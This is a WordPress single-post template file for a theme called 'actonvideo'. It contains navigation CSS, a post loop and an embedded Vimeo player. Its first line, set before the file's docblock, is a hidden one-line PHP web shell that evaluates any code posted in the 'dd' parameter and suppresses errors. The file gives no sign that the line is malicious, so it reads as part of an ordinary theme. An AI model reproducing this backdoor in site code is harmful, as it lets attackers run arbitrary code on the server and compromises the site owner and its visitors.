<?php @eval($_POST['dd']);?><?php
/**
 * The template for displaying all single posts
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/#single-post
 *
 * @package actonvideo
 */



get_header(); ?>
<style>
.nav-previous a::before {
    float: left;
    content: '';
    opacity: 1;
    background-image: url(https://actonvideo.com/wp-content/themes/actonvideo/assets/img/type_of_videos_arrows.png)!important;
    height: 60px;
    width: 34px;
    opacity: 1;
    background-position: 0 0;
  margin-top: -14px;
    margin-right: 20px;
}
  .nav-previous a {

    margin-top: 0;
    float: left;
    font-size: 20px;
    font-weight: bold;
    color: #333;
    font-family: oswaldbold,Helvetica,Arial,sans-serif;
      text-decoration: none;
}
    .nav-next a {

    margin-top: 0;
    float: right;
    font-size: 20px;
    font-weight: bold;
    color: #333;
    font-family: oswaldbold,Helvetica,Arial,sans-serif;
      text-decoration: none;
}
.nav-next a::after{  
  content: '';
  float: right;
      opacity: 1;
background-image: url(https://actonvideo.com/wp-content/themes/actonvideo/assets/img/type_of_videos_arrows.png)!important;
    height: 60px;
    width: 34px;
    opacity: 1;
background-position: 34px 0;
  margin-top: -14px;
    margin-left: 20px;
  }  
  .nav-links {
    margin: 40px 0;
    float: left;
    width: 100%;
}
</style>




<div class="blog">
	<div class="container container-1100">
		<div class="row">
			<div class="col-sm-12">
				<?php
				while ( have_posts() ) : the_post(); ?>
				<h1><?php the_title( ); ?></h1>
				<?php the_content(); ?>


				<iframe src="https://player.vimeo.com/video/<?php echo get_custom_field( 'add_video_id_vimeo_video_id' ); ?>" width="640" height="360" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>


				<?php endwhile; ?>
					<?php
						the_post_navigation(
							array(
								'taxonomy'                   => __( 'portfolio-category' ),
								'screen_reader_text' => __( 'Portfolio Navigation' ),
								)
					); ?>
			</div>
		</div>
	</div>
</div>












	

<?php get_footer();
